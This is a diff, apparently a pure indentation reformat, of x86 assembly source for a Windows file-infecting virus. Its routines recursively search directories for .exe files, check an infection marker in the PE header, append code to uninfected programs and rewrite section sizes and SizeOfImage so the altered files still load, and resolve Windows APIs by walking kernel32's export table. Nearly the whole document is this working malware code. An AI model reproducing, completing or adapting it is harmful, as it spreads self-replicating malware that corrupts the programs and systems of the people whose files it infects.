-cmp ebx, 200h
-jl end_file_alignment_label
-sub ebx,200h
-inc ecx
-jmp file_alignment_label 
+	cmp ebx, 200h
+	jl end_file_alignment_label
+	sub ebx,200h
+	inc ecx
+	jmp file_alignment_label 
 end_file_alignment_label:
-inc ecx
-mov ebx,0
+	inc ecx
+	mov ebx,0
 mul_loop:
-cmp ecx,0
-jz end_mul_loop
-dec ecx
-add ebx,200h
-jmp mul_loop
+	cmp ecx,0
+	jz end_mul_loop
+	dec ecx
+	add ebx,200h
+	jmp mul_loop
 end_mul_loop:
 ;size aligned by FileAlignment in ebx
-
-mov eax,offset ending
-sub eax,offset start; size of code 
-mov ecx,ebx
-sub ecx,eax;amount of zeros to align in ecx
-mov eax,dword ptr [esp+8];memory ptr
-mov edx,0
-mov dword ptr [eax],edx;fill with zeros
+	mov eax,offset ending
+	sub eax,offset start; size of code 
+	mov ecx,ebx
+	sub ecx,eax;amount of zeros to align in ecx
+	mov eax,dword ptr [esp+8];memory ptr
+	mov edx,0
+	mov dword ptr [eax],edx;fill with zeros
 
 add_zeros_label:
-cmp ecx,0
-jz end_add_zeros_label
-push ecx
-push eax
-push NULL
-add eax,4
-push eax
-sub eax,4
-push 1
-push eax
-mov eax,[esp+24h]
-push eax
-call [edi+ offset _WriteFile]
-pop eax
-pop ecx
-dec ecx
-jmp add_zeros_label
+	cmp ecx,0
+	jz end_add_zeros_label
+	push ecx
+	push eax
+	push NULL
+	add eax,4
+	push eax
+	sub eax,4
+	push 1
+	push eax
+	mov eax,[esp+24h]
+	push eax
+	call [edi+ offset _WriteFile]
+	pop eax
+	pop ecx
+	dec ecx
+	jmp add_zeros_label
 end_add_zeros_label:
 ;now file aligned
 
-push FILE_BEGIN
-push NULL
-mov eax,dword ptr [esp+08h];last section offset
-add eax,14h;PointerToRawData
-push eax
-mov eax,dword ptr [esp+18h]
-push eax
-call [edi+ _SetFilePointer]; file pointer on PointerToRawData
+	push FILE_BEGIN
+	push NULL
+	mov eax,dword ptr [esp+08h];last section offset
+	add eax,14h;PointerToRawData
+	push eax
+	mov eax,dword ptr [esp+18h]
+	push eax
+	call [edi+ _SetFilePointer]; file pointer on PointerToRawData
 
-mov eax,dword ptr [esp+08h]
-push NULL
-add eax,4
-push eax
-sub eax,4
-push 4
-push eax
-mov eax, dword ptr [esp+1Ch]
-push eax
-call [edi+ offset _ReadFile];reading PointerToRawData
+	mov eax,dword ptr [esp+08h]
+	push NULL
+	add eax,4
+	push eax
+	sub eax,4
+	push 4
+	push eax
+	mov eax, dword ptr [esp+1Ch]
+	push eax
+	call [edi+ offset _ReadFile];reading PointerToRawData
 
-push FILE_END
-push NULL
-push 0
-mov eax,dword ptr [esp+18h]
-push eax
-call [edi+ _SetFilePointer]; file pointer on end of file, size of file in eax
+	push FILE_END
+	push NULL
+	push 0
+	mov eax,dword ptr [esp+18h]
+	push eax
+	call [edi+ _SetFilePointer]; file pointer on end of file, size of file in eax
 
-mov ecx,dword ptr [esp+8];mem ptr
-mov ebx,dword ptr [ecx];PointerToRawData in ebx
-sub eax,ebx
+	mov ecx,dword ptr [esp+8];mem ptr
+	mov ebx,dword ptr [ecx];PointerToRawData in ebx
+	sub eax,ebx
 
-mov dword ptr [ecx],eax;real SizeOfRawData
+	mov dword ptr [ecx],eax;real SizeOfRawData
 
-push FILE_BEGIN
-push NULL
-mov eax,dword ptr [esp+8];last section offset
-add eax,10h;size of raw data
-push eax
-mov eax,dword ptr [esp+18h]
-push eax
-call [edi+ _SetFilePointer];file pointer on SizeOfRawData
+	push FILE_BEGIN
+	push NULL
+	mov eax,dword ptr [esp+8];last section offset
+	add eax,10h;size of raw data
+	push eax
+	mov eax,dword ptr [esp+18h]
+	push eax
+	call [edi+ _SetFilePointer];file pointer on SizeOfRawData
 
-mov ecx,dword ptr [esp+8]
-push NULL
-add ecx,4
-push ecx
-sub ecx,4
-push 4
-push ecx
-mov eax,[esp+1Ch]
-push eax
-call [edi+ offset _WriteFile];writing real SizeOfRawData
-;************************File Alignment*************************
+	mov ecx,dword ptr [esp+8]
+	push NULL
+	add ecx,4
+	push ecx
+	sub ecx,4
+	push 4
+	push ecx
+	mov eax,[esp+1Ch]
+	push eax
+	call [edi+ offset _WriteFile];writing real SizeOfRawData
+	;************************File Alignment*************************
 
-;************************Section Alignment**********************
-push FILE_BEGIN
-push NULL
-mov eax,dword ptr [esp+8];last section offset
-add eax,10h;size of raw data
-push eax
-mov eax,dword ptr [esp+18h]
-push eax
-call [edi+ _SetFilePointer];file pointer on SizeOfRawData
+	;************************Section Alignment**********************
+	push FILE_BEGIN
+	push NULL
+	mov eax,dword ptr [esp+8];last section offset
+	add eax,10h;size of raw data
+	push eax
+	mov eax,dword ptr [esp+18h]
+	push eax
+	call [edi+ _SetFilePointer];file pointer on SizeOfRawData
 
-push NULL
-mov eax,dword ptr [esp+0Ch]
-add eax,4
-push eax
-sub eax,4
-push 4
-push eax
-mov eax, dword ptr [esp+1Ch]
-push eax
-call [edi+ offset _ReadFile];reading SizeOfRawData
+	push NULL
+	mov eax,dword ptr [esp+0Ch]
+	add eax,4
+	push eax
+	sub eax,4
+	push 4
+	push eax
+	mov eax, dword ptr [esp+1Ch]
+	push eax
+	call [edi+ offset _ReadFile];reading SizeOfRawData
 
-mov eax,dword ptr[esp+8]
-mov ebx,dword ptr[eax]
-mov ecx,0
+	mov eax,dword ptr[esp+8]
+	mov ebx,dword ptr[eax]
+	mov ecx,0
 
 section_align_label1:
-cmp ebx,1000h
-jl end_section_align_label1
-inc ecx
-sub ebx,1000h
-jmp section_align_label1
+	cmp ebx,1000h
+	jl end_section_align_label1
+	inc ecx
+	sub ebx,1000h
+	jmp section_align_label1
 end_section_align_label1:
-inc ecx
-mov ebx,0
+	inc ecx
+	mov ebx,0
 section_align_label2:
-cmp ecx,0
+	cmp ecx,0
 jz end_section_align_label2
-dec ecx
-add ebx,1000h
-jmp section_align_label2
+	dec ecx
+	add ebx,1000h
+	jmp section_align_label2
 end_section_align_label2:
 ;in ebx aligned SizeOfRawData
 
-push ebx;aligned SizeOfRawData in stack
+	push ebx;aligned SizeOfRawData in stack
 
-mov eax,dword ptr[esp+4]
-add eax,8
-push FILE_BEGIN
-push NULL
-push eax
-mov eax,dword ptr [esp+1Ch]
-push eax
-call [edi+offset _SetFilePointer];file pointer on VirtualSize
+	mov eax,dword ptr[esp+4]
+	add eax,8
+	push FILE_BEGIN
+	push NULL
+	push eax
+	mov eax,dword ptr [esp+1Ch]
+	push eax
+	call [edi+offset _SetFilePointer];file pointer on VirtualSize
 
-mov eax,dword ptr [esp+0Ch]
-push NULL
-add eax,4
-push eax
-sub eax,4
-push 4
-push eax
-mov eax,dword ptr [esp+20h]
-push eax
-call [edi+offset _ReadFile];reading VirtualSize
+	mov eax,dword ptr [esp+0Ch]
+	push NULL
+	add eax,4
+	push eax
+	sub eax,4
+	push 4
+	push eax
+	mov eax,dword ptr [esp+20h]
+	push eax
+	call [edi+offset _ReadFile];reading VirtualSize
 
-mov eax,dword ptr [esp+0Ch]
-mov edx,dword ptr[eax]
-mov ecx,0
+	mov eax,dword ptr [esp+0Ch]
+	mov edx,dword ptr[eax]
+	mov ecx,0
 
 section_align_label3:
-cmp edx,1000h
-jl end_section_align_label3
-inc ecx
-sub edx,1000h
-jmp section_align_label3
+	cmp edx,1000h
+	jl end_section_align_label3
+	inc ecx
+	sub edx,1000h
+	jmp section_align_label3
 end_section_align_label3:
-inc ecx
-mov edx,0
+	inc ecx
+	mov edx,0
 section_align_label4:
-cmp ecx,0
-jz end_section_align_label4
-dec ecx
-add edx,1000h
-jmp section_align_label4
+	cmp ecx,0
+	jz end_section_align_label4
+	dec ecx
+	add edx,1000h
+	jmp section_align_label4
 end_section_align_label4:
-;in edx aligned VirtualSize
+	;in edx aligned VirtualSize
 
-mov ebx,dword ptr[esp]
-sub ebx,edx;in ebx value which need to add to ImageSize
+	mov ebx,dword ptr[esp]
+	sub ebx,edx;in ebx value which need to add to ImageSize
 
-mov eax,dword ptr[esp+8];PE signature offset
-add eax,50h;SizeOfImage 
-push FILE_BEGIN
-push NULL
-push eax
-mov eax,dword ptr [esp+1Ch]
-push eax
-call [edi+offset _SetFilePointer];file pointer on SizeOfImage
+	mov eax,dword ptr[esp+8];PE signature offset
+	add eax,50h;SizeOfImage 
+	push FILE_BEGIN
+	push NULL
+	push eax
+	mov eax,dword ptr [esp+1Ch]
+	push eax
+	call [edi+offset _SetFilePointer];file pointer on SizeOfImage
 
-mov eax,dword ptr [esp+0Ch]
-push NULL
-add eax,4
-push eax
-sub eax,4
-push 4
-push eax
-mov eax,dword ptr [esp+20h]
-push eax
-call [edi+offset _ReadFile];reading SizeOfImage
+	mov eax,dword ptr [esp+0Ch]
+	push NULL
+	add eax,4
+	push eax
+	sub eax,4
+	push 4
+	push eax
+	mov eax,dword ptr [esp+20h]
+	push eax
+	call [edi+offset _ReadFile];reading SizeOfImage
 
-mov eax, dword ptr [esp+0Ch]
-mov ecx,dword ptr [eax];in ecx SizeOfImage
-add ebx,ecx;real SizeOfImage
-mov dword ptr [eax],ebx
+	mov eax, dword ptr [esp+0Ch]
+	mov ecx,dword ptr [eax];in ecx SizeOfImage
+	add ebx,ecx;real SizeOfImage
+	mov dword ptr [eax],ebx
 
-mov eax,dword ptr[esp+8];PE signature offset
-add eax,50h;SizeOfImage 
-push FILE_BEGIN
-push NULL
-push eax
-mov eax,dword ptr [esp+1Ch]
-push eax
-call [edi+offset _SetFilePointer];file pointer on SizeOfImage
+	mov eax,dword ptr[esp+8];PE signature offset
+	add eax,50h;SizeOfImage 
+	push FILE_BEGIN
+	push NULL
+	push eax
+	mov eax,dword ptr [esp+1Ch]
+	push eax
+	call [edi+offset _SetFilePointer];file pointer on SizeOfImage
 
-mov ecx,dword ptr [esp+0Ch]
-push NULL
-add ecx,4
-push ecx
-sub ecx,4
-push 4
-push ecx
-mov eax,[esp+20h]
-push eax
-call [edi+ offset _WriteFile];writing real SizeOfImage
+	mov ecx,dword ptr [esp+0Ch]
+	push NULL
+	add ecx,4
+	push ecx
+	sub ecx,4
+	push 4
+	push ecx
+	mov eax,[esp+20h]
+	push eax
+	call [edi+ offset _WriteFile];writing real SizeOfImage
 
-pop ebx; aligned SizeOfRawData in stack
-mov eax, dword ptr [esp+8]
-mov dword ptr [eax],ebx
+	pop ebx; aligned SizeOfRawData in stack
+	mov eax, dword ptr [esp+8]
+	mov dword ptr [eax],ebx
 
-mov eax,dword ptr[esp]
-add eax,8
-push FILE_BEGIN
-push NULL
-push eax
-mov eax, dword ptr[esp+18h]
-push eax
-call [edi+offset _SetFilePointer];file pointer on VirtualSize
+	mov eax,dword ptr[esp]
+	add eax,8
+	push FILE_BEGIN
+	push NULL
+	push eax
+	mov eax, dword ptr[esp+18h]
+	push eax
+	call [edi+offset _SetFilePointer];file pointer on VirtualSize
 
-mov ecx,dword ptr [esp+8h]
-push NULL
-add ecx,4
-push ecx
-sub ecx,4
-push 4
-push ecx
-mov eax,[esp+1Ch]
-push eax
-call [edi+ offset _WriteFile];writing real VirtualSize
-;************************Section Alignment**********************
+	mov ecx,dword ptr [esp+8h]
+	push NULL
+	add ecx,4
+	push ecx
+	sub ecx,4
+	push 4
+	push ecx
+	mov eax,[esp+1Ch]
+	push eax
+	call [edi+ offset _WriteFile];writing real VirtualSize
+	;************************Section Alignment**********************
 
-add esp,8
+	add esp,8
 
-call [edi+offset _LocalFree]
-call [edi+offset _CloseHandle]
-popfd
-popad
-ret
+	call [edi+offset _LocalFree]
+	call [edi+offset _CloseHandle]
+	popfd
+	popad
+	ret
 Infect endp
 
 ;*****************************************************************
 ;in
-;esi-pointer to 1st asciiz str
-;edx-pointer to 2nd asciiz str
+	;esi-pointer to 1st asciiz str
+	;edx-pointer to 2nd asciiz str
 ;out
-;eax-1:true;0:false
+	;eax-1:true;0:false
 ;*****************************************************************
 StrCMP proc
-pushf
-push ebx
-mov eax,0
+	pushf
+	push ebx
+	mov eax,0
 loop_label:
 	mov bl,byte ptr[esi+eax]
 	cmp bl,byte ptr[edx+eax]
@@ -1031,38 +1037,38 @@ loop_label:
 	inc eax
 	jmp loop_label
 not_equal:
-mov eax,0
-jmp finish
+	mov eax,0
+	jmp finish
 equal:
-mov eax,1
+	mov eax,1
 finish:
-pop ebx
-popf
-ret
+	pop ebx
+	popf
+	ret
 StrCMP endp
 
 ;---------------------------------
 ;in
-;esi-pointer to asciiz string
+	;esi-pointer to asciiz string
 ;out 
-;eax-string length 
+	;eax-string length 
 ;---------------------------------
 StrLen proc
-mov eax,0
+	mov eax,0
 loop_label:
-cmp byte ptr [esi+eax],0
-jz exit
-inc eax
-jmp loop_label
+	cmp byte ptr [esi+eax],0
+	jz exit
+	inc eax
+	jmp loop_label
 exit:
-ret
+	ret
 StrLen endp
 
 ;*****************************************************************
 ;in
-;esi-address of file
+	;esi-address of file
 ;out
-;eax-1:file is PE;2-file is not PE 
+	;eax-1:file is PE;2-file is not PE 
 ;*****************************************************************
 IsPE proc
     pushf
@@ -1073,10 +1079,10 @@ IsPE proc
 	cmp dword ptr [esi], "EP"
 	jnz notPE
 	mov eax,1
-      pop esi
+    pop esi
 	popf
 	ret
-   notPE:
+notPE:
     mov eax,0
     pop esi
 	popf
@@ -1084,7 +1090,7 @@ IsPE proc
 IsPE endp
 ;-----------------------------------------------------
 ;in 
-;esi: address somewhere in PE
+	;esi: address somewhere in PE
 ;-----------------------------------------------------
 GetPEImageBase proc
 	pushf
@@ -1109,63 +1115,63 @@ GetPEImageBase endp
 ;esi-address of GetProcAddress
 ;*****************************************************************
 GetGetProcAddress proc
-pushf
-push edi
-mov edi,esi
-push ecx
-add esi,[esi+3Ch]
-add esi,78h; to export_directory
-mov esi,[esi]
-add esi,edi;base
-mov  ecx,esi
-mov esi,[esi+20h]
-add esi,edi;base
-;mov esi,[esi]
-;add esi,edi
+	pushf
+	push edi
+	mov edi,esi
+	push ecx
+	add esi,[esi+3Ch]
+	add esi,78h; to export_directory
+	mov esi,[esi]
+	add esi,edi;base
+	mov  ecx,esi
+	mov esi,[esi+20h]
+	add esi,edi;base
+	;mov esi,[esi]
+	;add esi,edi
 
-push eax
-mov eax,0;as index
-push ebx
-mov ebx, esi
-mov esi,dword ptr [esp+0Ch];delta offset
-add esi, offset GetProcAddress_
-push edx
+	push eax
+	mov eax,0;as index
+	push ebx
+	mov ebx, esi
+	mov esi,dword ptr [esp+0Ch];delta offset
+	add esi, offset GetProcAddress_
+	push edx
 loop_label:
-mov edx,[ebx+eax*4]
-add edx,edi
-push eax
-call StrCMP
-cmp eax,0
-jnz index_found
-pop eax
-inc eax
-jmp loop_label
+	mov edx,[ebx+eax*4]
+	add edx,edi
+	push eax
+	call StrCMP
+	cmp eax,0
+	jnz index_found
+	pop eax
+	inc eax
+	jmp loop_label
 index_found:
-pop eax;index here
-pop edx
-pop ebx
-mov esi, ecx
-mov esi,[esi+24h];now ordinal
-add esi,edi
-add eax,eax
-mov esi,[esi+eax]
-push eax
-mov eax,ecx
-;sub esi,dword ptr [eax+10h];index of function in address array
-pop eax
-and esi,0FFFFh
-push esi
-mov esi,ecx
-mov eax,[esi+1Ch]
-pop esi
-add eax, edi
-mov esi,[eax+esi*4]
-add esi,edi
-pop eax
-pop ecx
-pop edi
-popf
-ret
+	pop eax;index here
+	pop edx
+	pop ebx
+	mov esi, ecx
+	mov esi,[esi+24h];now ordinal
+	add esi,edi
+	add eax,eax
+	mov esi,[esi+eax]
+	push eax
+	mov eax,ecx
+	;sub esi,dword ptr [eax+10h];index of function in address array
+	pop eax
+	and esi,0FFFFh
+	push esi
+	mov esi,ecx
+	mov eax,[esi+1Ch]
+	pop esi
+	add eax, edi
+	mov esi,[eax+esi*4]
+	add esi,edi
+	pop eax
+	pop ecx
+	pop edi
+	popf
+	ret
 GetGetProcAddress endp
 
 ;---------------------------------------------------------------------------------------
@@ -1175,381 +1181,380 @@ GetGetProcAddress endp
 ;eax:1-infected;0-not infected;-2 - error 
 ;---------------------------------------------------------------------------------------
 IsInfected proc
-pushfd
-push NULL
-push FILE_ATTRIBUTE_NORMAL
-push OPEN_EXISTING
-push NULL
-push 0
-push GENERIC_READ
-push esi
-call [edi+offset _CreateFileA]
+	pushfd
+	push NULL
+	push FILE_ATTRIBUTE_NORMAL
+	push OPEN_EXISTING
+	push NULL
+	push 0
+	push GENERIC_READ
+	push esi
+	call [edi+offset _CreateFileA]
 
-cmp eax, INVALID_HANDLE_VALUE
-jz error
+	cmp eax, INVALID_HANDLE_VALUE
+	jz error
 
-push eax;file handle in stack
+	push eax;file handle in stack
 
-push FILE_BEGIN
-push NULL
-push 3Ch
-push eax
-call [edi+offset _SetFilePointer]
+	push FILE_BEGIN
+	push NULL
+	push 3Ch
+	push eax
+	call [edi+offset _SetFilePointer]
 
-push 8
-push LPTR
-call [edi+offset _LocalAlloc]
+	push 8
+	push LPTR
+	call [edi+offset _LocalAlloc]
 
-push eax;pointer to memory in stack
+	push eax;pointer to memory in stack
 
-push NULL
-add eax,4
-push eax
-sub eax,4
-push 4
-push eax
-mov eax, dword ptr [esp+14h]
-push eax
-call [edi+offset _ReadFile]
+	push NULL
+	add eax,4
+	push eax
+	sub eax,4
+	push 4
+	push eax
+	mov eax, dword ptr [esp+14h]
+	push eax
+	call [edi+offset _ReadFile]
 
-mov ebx,dword ptr [esp]
-mov eax,dword ptr [ebx];pointer to PE header
-add eax,4Ch;pointer to field 'Reserved1'
+	mov ebx,dword ptr [esp]
+	mov eax,dword ptr [ebx];pointer to PE header
+	add eax,4Ch;pointer to field 'Reserved1'
 
-push FILE_BEGIN
-push NULL
-push eax
-mov eax,dword ptr [esp+10h]
-push eax
-call [edi+offset _SetFilePointer]
+	push FILE_BEGIN
+	push NULL
+	push eax
+	mov eax,dword ptr [esp+10h]
+	push eax
+	call [edi+offset _SetFilePointer]
 
-mov eax,dword ptr [esp]
-push NULL
-add eax,4
-push eax
-sub eax,4
-push 4
-push eax
-mov eax,dword ptr [esp+14h]
-push eax
-call [edi+offset _ReadFile]
+	mov eax,dword ptr [esp]
+	push NULL
+	add eax,4
+	push eax
+	sub eax,4
+	push 4
+	push eax
+	mov eax,dword ptr [esp+14h]
+	push eax
+	call [edi+offset _ReadFile]
 
-mov eax,dword ptr [esp+4]
-push eax;handle in eax
-call [edi+offset _CloseHandle]
+	mov eax,dword ptr [esp+4]
+	push eax;handle in eax
+	call [edi+offset _CloseHandle]
 
-mov ebx,dword ptr [esp]
-mov eax,dword ptr [ebx]
+	mov ebx,dword ptr [esp]
+	mov eax,dword ptr [ebx]
 
-push eax
+	push eax
 
-push ebx
-call [edi+offset _LocalFree]
+	push ebx
+	call [edi+offset _LocalFree]
 
-pop eax
+	pop eax
 
-cmp eax,0ABCDDCBAh
-jz inf_label
+	cmp eax,0ABCDDCBAh
+	jz inf_label
 
-add esp,8
-popfd
-mov eax,0
-ret
+	add esp,8
+	popfd
+	mov eax,0
+	ret
 
 inf_label:
-add esp,8
-popfd
-mov eax,1
-ret
+	add esp,8
+	popfd
+	mov eax,1
+	ret
 
 error:
-mov eax,2
-popfd
-ret
+	mov eax,2
+	popfd
+	ret
 IsInfected endp
 
 ;-----------------------------------------------------------------------------------------------
 ;in
-;esi-pointer to asciiz string 
+	;esi-pointer to asciiz string 
 ;-----------------------------------------------------------------------------------------------
 SearchEXE proc
-LOCAL w32fd:WIN32_FIND_DATA
-pushad
-pushfd
+	LOCAL w32fd:WIN32_FIND_DATA
+	pushad
+	pushfd
 
-call StrLen
+	call StrLen
 
-add eax,7;length of "\*.exe" and 0
-push eax
-push LPTR
-call [edi+offset _LocalAlloc]
+	add eax,7;length of "\*.exe" and 0
+	push eax
+	push LPTR
+	call [edi+offset _LocalAlloc]
 
-mov ecx,0
+	mov ecx,0
 loop1:;copying path 
-cmp byte ptr [esi+ecx],0
-jz end_loop1
-mov bl, byte ptr [esi+ecx]
-mov byte ptr [eax+ecx], bl
-inc ecx
-jmp loop1 
+	cmp byte ptr [esi+ecx],0
+	jz end_loop1
+	mov bl, byte ptr [esi+ecx]
+	mov byte ptr [eax+ecx], bl
+	inc ecx
+	jmp loop1 
 end_loop1:
-mov word ptr [eax+ecx], '*\'
-add ecx,2
-mov dword ptr [eax+ecx], 'exe.'
-add ecx,4
-mov byte ptr [eax+ecx], 0
+	mov word ptr [eax+ecx], '*\'
+	add ecx,2
+	mov dword ptr [eax+ecx], 'exe.'
+	add ecx,4
+	mov byte ptr [eax+ecx], 0
 
-lea ecx, w32fd
+	lea ecx, w32fd
 
-push eax;memory pointer in stack
+	push eax;memory pointer in stack
 
-push ecx; pointer to w32fd
-push eax; search shema
-call [edi+offset _FindFirstFileA]
+	push ecx; pointer to w32fd
+	push eax; search shema
+	call [edi+offset _FindFirstFileA]
 
-mov ecx,eax
-push ecx
-call [edi+offset _GetLastError]
-pop ecx
+	mov ecx,eax
+	push ecx
+	call [edi+offset _GetLastError]
+	pop ecx
 
-mov edx,eax
-push ecx;search handle
-push edx;error number
+	mov edx,eax
+	push ecx;search handle
+	push edx;error number
 
-mov eax,dword ptr [esp+8]
-push eax
-call [edi+offset _LocalFree]
+	mov eax,dword ptr [esp+8]
+	push eax
+	call [edi+offset _LocalFree]
 
-pop edx; error number
-pop ecx;search handle
-pop eax
-push ecx;CloseHandle argument
-cmp edx, ERROR_FILE_NOT_FOUND
-jz file_not_found_label
+	pop edx; error number
+	pop ecx;search handle
+	pop eax
+	push ecx;CloseHandle argument
+	cmp edx, ERROR_FILE_NOT_FOUND
+	jz file_not_found_label
 
 loop4:
-call StrLen
-push eax
-push esi
-lea esi, w32fd.cFileName
-call StrLen
-pop esi
-mov ebx,eax
-pop eax
-add eax,ebx
-add eax,2; now exe path length in eax
-push eax
-push LPTR
-call [edi+offset _LocalAlloc]
+	call StrLen
+	push eax
+	push esi
+	lea esi, w32fd.cFileName
+	call StrLen
+	pop esi
+	mov ebx,eax
+	pop eax
+	add eax,ebx
+	add eax,2; now exe path length in eax
+	push eax
+	push LPTR
+	call [edi+offset _LocalAlloc]
 
-mov edx,0
+	mov edx,0
 
 loop2:;copying path 
-cmp byte ptr [esi+edx],0
-jz end_loop2
-mov bl, byte ptr [esi+edx]
-mov byte ptr [eax+edx], bl
-inc edx
-jmp loop2 
+	cmp byte ptr [esi+edx],0
+	jz end_loop2
+	mov bl, byte ptr [esi+edx]
+	mov byte ptr [eax+edx], bl
+	inc edx
+	jmp loop2 
 end_loop2:
+	mov byte ptr [eax+edx], '\'
 
-mov byte ptr [eax+edx], '\'
+	push eax
+	push esi
 
-push eax
-push esi
-
-add eax, edx
-inc eax
-mov edx,0
-lea esi, w32fd.cFileName
+	add eax, edx
+	inc eax
+	mov edx,0
+	lea esi, w32fd.cFileName
 loop3:;copying filename 
-cmp byte ptr [esi+edx],0
-jz end_loop3
-mov bl, byte ptr [esi+edx]
-mov byte ptr [eax+edx], bl
-inc edx
-jmp loop3 
+	cmp byte ptr [esi+edx],0
+	jz end_loop3
+	mov bl, byte ptr [esi+edx]
+	mov byte ptr [eax+edx], bl
+	inc edx
+	jmp loop3 
 end_loop3:
-mov byte ptr [eax+edx],0;now in eax path of exe
-mov esi,dword ptr [esp+4]
+	mov byte ptr [eax+edx],0;now in eax path of exe
+	mov esi,dword ptr [esp+4]
 
-;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
-call IsInfected
-cmp eax,1
-jz go_on
-mov eax,dword ptr [edi+offset victim_count]
-push eax;victim_count in stack
-mov eax,dword ptr [edi+offset victim]
-mov dword ptr [edi+offset victim_count],eax
-call Incubation
-cmp eax,-1
-jz not_infectable_exe
-call Infect
+	;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+	call IsInfected
+	cmp eax,1
+	jz go_on
+	mov eax,dword ptr [edi+offset victim_count]
+	push eax;victim_count in stack
+	mov eax,dword ptr [edi+offset victim]
+	mov dword ptr [edi+offset victim_count],eax
+	call Incubation
+	cmp eax,-1
+	jz not_infectable_exe
+	call Infect
 not_infectable_exe:
-pop eax
-dec eax
-mov dword ptr [edi+offset victim_count],eax
-cmp eax,0
-jnz go_on
-mov eax,dword ptr [edi+offset victim]
-mov dword ptr [edi+offset victim_count],eax
-pop eax
-pop eax
-jmp exit
-;need to stack
-;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+	pop eax
+	dec eax
+	mov dword ptr [edi+offset victim_count],eax
+	cmp eax,0
+	jnz go_on
+	mov eax,dword ptr [edi+offset victim]
+	mov dword ptr [edi+offset victim_count],eax
+	pop eax
+	pop eax
+	jmp exit
+	;need to stack
+	;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 go_on:
-pop esi
-pop eax
+	pop esi
+	pop eax
 
-pop ecx
-push ecx
-lea eax, w32fd
-push eax
-push ecx
-call [edi+offset _FindNextFileA]
-cmp eax, TRUE
-jz loop4
+	pop ecx
+	push ecx
+	lea eax, w32fd
+	push eax
+	push ecx
+	call [edi+offset _FindNextFileA]
+	cmp eax, TRUE
+	jz loop4
 
 file_not_found_label:
-call [edi+offset _CloseHandle]
-;###############-now directory search-######################
-call StrLen
-add eax,3
-push eax
-push LPTR
-call [edi+offset _LocalAlloc]
+	call [edi+offset _CloseHandle]
+	;###############-now directory search-######################
+	call StrLen
+	add eax,3
+	push eax
+	push LPTR
+	call [edi+offset _LocalAlloc]
 
-mov ecx,0
+	mov ecx,0
 loop5:;copying path 
-cmp byte ptr [esi+ecx],0
-jz end_loop5
-mov bl, byte ptr [esi+ecx]
-mov byte ptr [eax+ecx], bl
-inc ecx
-jmp loop5 
+	cmp byte ptr [esi+ecx],0
+	jz end_loop5
+	mov bl, byte ptr [esi+ecx]
+	mov byte ptr [eax+ecx], bl
+	inc ecx
+	jmp loop5 
 end_loop5:
-mov word ptr [eax+ecx],'*\'
-inc ecx
-inc ecx
-mov byte ptr [eax+ecx],0;now in eax address of directory shema
-lea ecx, w32fd
+	mov word ptr [eax+ecx],'*\'
+	inc ecx
+	inc ecx
+	mov byte ptr [eax+ecx],0;now in eax address of directory shema
+	lea ecx, w32fd
 
-push eax;mem ptr
+	push eax;mem ptr
 
-push ecx
-push eax
-call [edi+offset _FindFirstFileA]
+	push ecx
+	push eax
+	call [edi+offset _FindFirstFileA]
 
-mov ecx,eax
-push ecx
-call [edi+offset _GetLastError]
-pop ecx
+	mov ecx,eax
+	push ecx
+	call [edi+offset _GetLastError]
+	pop ecx
 
-mov edx,eax
-push ecx
-push edx
-mov eax,dword ptr [esp+8]
-push eax
-call [edi+offset _LocalFree]
-pop edx;error number
-pop ecx;handle in ecx
-pop eax
-push ecx;CloseHandle
-cmp edx, ERROR_FILE_NOT_FOUND
-jz exit
+	mov edx,eax
+	push ecx
+	push edx
+	mov eax,dword ptr [esp+8]
+	push eax
+	call [edi+offset _LocalFree]
+	pop edx;error number
+	pop ecx;handle in ecx
+	pop eax
+	push ecx;CloseHandle
+	cmp edx, ERROR_FILE_NOT_FOUND
+	jz exit
 
 loop6:
-mov eax,w32fd.dwFileAttributes
-and eax, FILE_ATTRIBUTE_DIRECTORY
-cmp eax, 0
-jz not_dir
-lea eax, w32fd.cFileName
+	mov eax,w32fd.dwFileAttributes
+	and eax, FILE_ATTRIBUTE_DIRECTORY
+	cmp eax, 0
+	jz not_dir
+	lea eax, w32fd.cFileName
 
-cmp byte ptr [eax],'.'
-jz temp_not_dir
-jmp is_dir
+	cmp byte ptr [eax],'.'
+	jz temp_not_dir
+	jmp is_dir
 temp_not_dir:
-inc eax
-cmp byte ptr [eax],0
-jz not_dir
-cmp byte ptr [eax],'.'
-jz temp_not_dir1
-jmp is_dir
+	inc eax
+	cmp byte ptr [eax],0
+	jz not_dir
+	cmp byte ptr [eax],'.'
+	jz temp_not_dir1
+	jmp is_dir
 temp_not_dir1:
-inc eax
-cmp byte ptr [eax],0
-jz not_dir
+	inc eax
+	cmp byte ptr [eax],0
+	jz not_dir
 
 is_dir:
-call StrLen
-push eax
-push esi
-lea esi, w32fd.cFileName
-call StrLen
-mov ebx, esi
-pop esi
-pop eax
-add eax,ebx
-add eax,2;dir name length 
-push eax
-push LPTR
-call [edi+offset _LocalAlloc]
+	call StrLen
+	push eax
+	push esi
+	lea esi, w32fd.cFileName
+	call StrLen
+	mov ebx, esi
+	pop esi
+	pop eax
+	add eax,ebx
+	add eax,2;dir name length 
+	push eax
+	push LPTR
+	call [edi+offset _LocalAlloc]
 
-mov ecx,0
+	mov ecx,0
 loop7:;copying path 
-cmp byte ptr [esi+ecx],0
-jz end_loop7
-mov bl, byte ptr [esi+ecx]
-mov byte ptr [eax+ecx], bl
-inc ecx
-jmp loop7 
+	cmp byte ptr [esi+ecx],0
+	jz end_loop7
+	mov bl, byte ptr [esi+ecx]
+	mov byte ptr [eax+ecx], bl
+	inc ecx
+	jmp loop7 
 end_loop7:
-mov byte ptr [eax+ecx], '\'
+	mov byte ptr [eax+ecx], '\'
 
-push esi
-lea esi, w32fd.cFileName
-push eax
-add eax,ecx
-inc eax
-mov ecx,0
+	push esi
+	lea esi, w32fd.cFileName
+	push eax
+	add eax,ecx
+	inc eax
+	mov ecx,0
 loop8:;now copy dir name
-cmp byte ptr [esi+ecx],0
-jz end_loop8
-mov bl, byte ptr [esi+ecx]
-mov byte ptr [eax+ecx], bl
-inc ecx
-jmp loop8 
+	cmp byte ptr [esi+ecx],0
+	jz end_loop8
+	mov bl, byte ptr [esi+ecx]
+	mov byte ptr [eax+ecx], bl
+	inc ecx
+	jmp loop8 
 end_loop8:
-mov byte ptr [eax+ecx], 0
-pop eax;now in eax  dir address and name
-mov esi, eax
-call SearchEXE 
-pop esi
-push eax
-call [edi+offset _LocalFree]
+	mov byte ptr [eax+ecx], 0
